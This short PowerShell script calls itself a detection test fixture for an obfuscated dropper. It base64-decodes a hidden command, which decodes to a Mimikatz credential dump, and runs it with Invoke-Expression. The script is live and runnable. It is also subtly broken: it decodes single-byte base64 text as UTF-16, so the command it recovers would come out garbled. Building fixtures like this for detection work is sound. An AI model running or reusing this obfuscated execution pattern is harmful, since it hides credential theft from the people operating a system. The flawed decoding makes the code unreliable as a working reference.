# [DETECTION TEST FIXTURE: Obfuscated PowerShell Dropper Pattern]
# MITRE ATT&CK: T1059.001 (PowerShell), T1003 (Credential Dumping)
$encodedCommand = "SW52b2tlLU1pbWlrYXR6IC1EdW1wQ3JlZHM="
$decodedBytes = [System.Convert]::FromBase64String($encodedCommand)
$rawCommand = [System.Text.Encoding]::Unicode.GetString($decodedBytes)
Write-Host "Staging payload execution: " + $rawCommand
Invoke-Expression $rawCommand
